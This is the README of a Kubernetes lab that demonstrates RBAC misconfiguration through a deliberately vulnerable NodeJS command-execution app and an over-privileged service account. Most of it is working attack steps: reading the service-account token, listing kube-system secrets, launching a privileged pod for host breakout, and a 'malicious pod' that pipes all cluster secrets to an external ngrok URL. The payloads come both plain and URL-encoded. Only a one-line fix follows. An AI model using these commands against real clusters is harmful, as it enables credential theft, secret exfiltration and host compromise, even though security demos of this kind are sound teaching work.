# RBAC issues

## Context
RBAC (Role-based access control) (wiki)[https://en.wikipedia.org/wiki/Role-based_access_control].

When a k8 cluster defines resources, it decides what permissions each resource is entitled to;
Misconfiguring a resource can result K8 cluster components performing outside of their scope, i.e.:
* Exposing inner cluster secrets, tokens and basically everything accessible by the K8 inner API
* Spinning up a privileged pod and gaining root over the host [[Kiril's demo](k8s/PrivilegedPod)]  

### PoC explanation
We'd like to demo what can happen if one managed to access a wrongfully-permissioned resource (via a container in this case);

Our demo begins **after** one has achieved RCE on a cluster container and will showcase what can happen starting from that point;

> We chose not to demo RCE-achieving on a container as this diverges from the intent of this demo and was also demoed before.  

That being said, the steps will begin by interacting with one of the containers themselves as in you were in already in RCE state 

## Setup

Run the following:
```
$ minikube start
$ ...
$ ./build.sh # chmod +x if needed
```

This will do the following:
* Spin up an "app" pod(`:3000`), simple NodeJs app which basically executes any command given (our entry point for initial RCE);
* Define a new "CI service", set the "app" service account as "CI Service"
* Define a new cluster role "CI role" **as too privileged**(got access to `*`)
* Define a cluster role binding and set "CI service" to be of "CI role"

## Exploit

<details>
  <summary>Spoiler alert</summary>
As we explained, we start our journey from the "ci app" and perform RCE using it;
The way we interact w/ the app is via HTTP requests to `/?cmd=<ANY_BASH_CMD>`;

> This means that we execute the commands inside a pod!
>
That being said, let's fetch the IP of this service initially from within our local cluster:

```
$ minikube service ci-service --url=true
```
This should return something like: `http://192.168.39.72:30553`
> in the wild we would access this app via public internet; in this demo we must get it from our minikube first;
 
> From this point on we will use `` to evaluate bash commands;

Run ls:
````
curl `minikube service ci-service --url=true`?cmd=ls
````

See all env variables:
````
curl `minikube service ci-service --url=true`?cmd=env
````

Get the token
````
curl `minikube service ci-service --url=true`?cmd=cat%20/run/secrets/kubernetes.io/serviceaccount/token
````

Query for admin stuff using `KUBE_TOKEN` and the [K8 API](https://kubernetes.io/docs/concepts/overview/kubernetes-api/)
> Each example will contain a `decoded` and `encoded` parts; Each has the same payload, tho the encoded version is URI encoded, so we can use spaces etc
> 
> Use this website to uri encode for easy encoding: https://meyerweb.com/eric/tools/dencoder/
````
decoded

KUBE_TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods/$HOSTNAME

encoded
%0AKUBE_TOKEN%3D%60cat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken%60%3B%20curl%20-sSk%20-H%20%22Authorization%3A%20Bearer%20%24KUBE_TOKEN%22%20https%3A%2F%2F%24KUBERNETES_SERVICE_HOST%3A%24KUBERNETES_PORT_443_TCP_PORT%2Fapi%2Fv1%2Fnamespaces%2Fdefault%2Fpods%2F%24HOSTNAME
````

List all secrets
````
decoded
KUBE_TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets/

encoded
%0AKUBE_TOKEN%3D%60cat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken%60%3B%20curl%20-sSk%20-H%20%22Authorization%3A%20Bearer%20%24KUBE_TOKEN%22%20https%3A%2F%2F%24KUBERNETES_SERVICE_HOST%3A%24KUBERNETES_PORT_443_TCP_PORT%2Fapi%2Fv1%2Fnamespaces%2Fkube-system%2Fsecrets%2F%0A
````

### Examples
#### 1. Vulnerable pod
We first need to write a json file and then apply it to the cluster (like `kubectl apply -f FILE`)
> Note the `privileged:true` in the pod declaration! This leads to root on the host if the attacker wants to. 

generate nginx pod (visualise changes with `minikube dashboard`)
````
decoded

cat > nginx-pod.json <<EOF
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "nginx1"
    },
    "spec": {
        "containers": [
            {
                "name": "nginx",
                "image": "nginx:1.7.9",
                "ports": [
                    {
                        "containerPort": 80
                    }
                ],

                "securityContext":{
                    "privileged": true
                }
            }
        ]
    }
}
EOF


ENCODED
cat%20%3E%20nginx-pod.json%20%3C%3CEOF%0A%7B%0A%20%20%20%20%22apiVersion%22%3A%20%22v1%22%2C%0A%20%20%20%20%22kind%22%3A%20%22Pod%22%2C%0A%20%20%20%20%22metadata%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%22name%22%3A%20%22nginx1%22%0A%20%20%20%20%7D%2C%0A%20%20%20%20%22spec%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%22containers%22%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22name%22%3A%20%22nginx%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22image%22%3A%20%22nginx%3A1.7.9%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22ports%22%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22containerPort%22%3A%2080%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22securityContext%22%3A%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22privileged%22%3A%20true%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%5D%0A%20%20%20%20%7D%0A%7D%0AEOF
````
dispatch it
```
KUBE_TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`;
curl -k -v -X POST -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods -d@nginx-pod.json    


ENCODED
KUBE_TOKEN%3D%60cat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken%60%3B%0Acurl%20-k%20-v%20-X%20POST%20-H%20%22Authorization%3A%20Bearer%20%24KUBE_TOKEN%22%20-H%20%22Content-Type%3A%20application%2Fjson%22%20https%3A%2F%2F%24KUBERNETES_SERVICE_HOST%3A%24KUBERNETES_PORT_443_TCP_PORT%2Fapi%2Fv1%2Fnamespaces%2Fdefault%2Fpods%20-d%40nginx-pod.json
```

This is it! :) 
From this point one can tap into the privileged container and "break out of it";

#### 2. Malicious Pod
Below is an example of pod that dispatches (via simple `curl`) all the k8 secrets;
> I'm using ngrok for simple globally-accessible local server. [See here for installation](https://dashboard.ngrok.com/get-started/setup).
>
> Once installed, initiate the server (`$ ngrok http 3000`)and swap the IP in the malicious pod to the one from your ngrok client; 
> you can browse to `http://127.0.0.1:4040` to see visual log of the connections  

Malicious pod
```

decoded
cat > bad-pod.json <<EOF
{
	"apiVersion": "v1",
	"kind": "Pod",
	"metadata": {
		"name": "nginx2",
	},
	"spec": {
		"containers": [
			{
                "name": "nginx",
                "image": "nginx:1.7.9",
				"command": [
					"/bin/bash"
				],
				"args": [
					"-c",
					"apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | curl http://166a39ea.ngrok.io; sleep 100000"
				]
			}
		],
		"serviceAccountName": "ci-service",
		"automountServiceAccountToken": true,
		"hostNetwork": true
	}
}
EOF

ENCODED
cat%20%3E%20bad-pod.json%20%3C%3CEOF%0A%7B%0A%09%22apiVersion%22%3A%20%22v1%22%2C%0A%09%22kind%22%3A%20%22Pod%22%2C%0A%09%22metadata%22%3A%20%7B%0A%09%09%22name%22%3A%20%22nginx2%22%2C%0A%09%7D%2C%0A%09%22spec%22%3A%20%7B%0A%09%09%22containers%22%3A%20%5B%0A%09%09%09%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22name%22%3A%20%22nginx%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22image%22%3A%20%22nginx%3A1.7.9%22%2C%0A%09%09%09%09%22command%22%3A%20%5B%0A%09%09%09%09%09%22%2Fbin%2Fbash%22%0A%09%09%09%09%5D%2C%0A%09%09%09%09%22args%22%3A%20%5B%0A%09%09%09%09%09%22-c%22%2C%0A%09%09%09%09%09%22apk%20update%20%26%26%20apk%20add%20curl%20--no-cache%3B%20cat%20%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken%20%7C%20%7B%20read%20TOKEN%3B%20curl%20-k%20-v%20-H%20%5C%22Authorization%3A%20Bearer%20%24TOKEN%5C%22%20-H%20%5C%22Content-Type%3A%20application%2Fjson%5C%22%20https%3A%2F%2F192.168.154.228%3A8443%2Fapi%2Fv1%2Fnamespaces%2Fkube-system%2Fsecrets%3B%20%7D%20%7C%20curl%20http%3A%2F%2F166a39ea.ngrok.io%3B%20sleep%20100000%22%0A%09%09%09%09%5D%0A%09%09%09%7D%0A%09%09%5D%2C%0A%09%09%22serviceAccountName%22%3A%20%22ci-service%22%2C%0A%09%09%22automountServiceAccountToken%22%3A%20true%2C%0A%09%09%22hostNetwork%22%3A%20true%0A%09%7D%0A%7D%0AEOF
```

Dispatch
```
KUBE_TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`;
curl -k -v -X POST -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods -d@bad-pod.json

encoded
KUBE_TOKEN%3D%60cat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken%60%3B%0Acurl%20-k%20-v%20-X%20POST%20-H%20%22Authorization%3A%20Bearer%20%24KUBE_TOKEN%22%20-H%20%22Content-Type%3A%20application%2Fjson%22%20https%3A%2F%2F%24KUBERNETES_SERVICE_HOST%3A%24KUBERNETES_PORT_443_TCP_PORT%2Fapi%2Fv1%2Fnamespaces%2Fdefault%2Fpods%20-d%40bad-pod.json
```
</details>


### Fix

To fix this problem one should set the role permissions when defining the cluster role; Simple yet dangerous;  
